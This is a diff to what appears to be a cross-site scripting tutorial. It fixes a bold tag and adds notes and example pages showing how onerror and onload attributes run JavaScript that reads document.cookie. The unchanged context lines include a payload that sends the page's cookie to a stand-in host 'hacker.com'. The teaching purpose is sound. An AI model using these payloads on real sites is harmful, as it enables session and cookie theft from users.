@@ -182,7 +182,7 @@ print ("Thanks for your interest in %s",name);
 <a href="javascript: alert(document.cookie);">Click here to win</a>
 <input type=“button” value=“submit” onclick="parent.location.reload(‘http://hacker.com?c’=encodeURI(document.cookie));">
 ```
-<br><p><b>Inline Javascript:<b></p>
+<br><p><b>Inline Javascript:</b></p>
   
   ```html
 <html>
@@ -197,8 +197,28 @@ print ("Thanks for your interest in %s",name);
   </body>
 </html>
 ```
+  
+ <p>You are looking for an input that lets you feed an exploit back to the page.<br>
+• Some document elements have properties like <b>OnClick,OnLoad, OnChange, OnSubmit, OnMove, OnKeyPress</b> and so on.<br>
+• These are by definition, Javascript, without any specific tags.</p>
 
-
+```html
+<html>
+  <body>
+    <h3>XSS version 3</h3>
+    <img src="no_such_file.jpg" onerror=alert(document.cookie);>
+  </body>
+</html>
+```
+    
+```html
+<html>
+  <body onload=alert(document.cookie);>
+    <h3>XSS version 4</h3>
+  </body>
+</html>
+```
+    
 
 
 
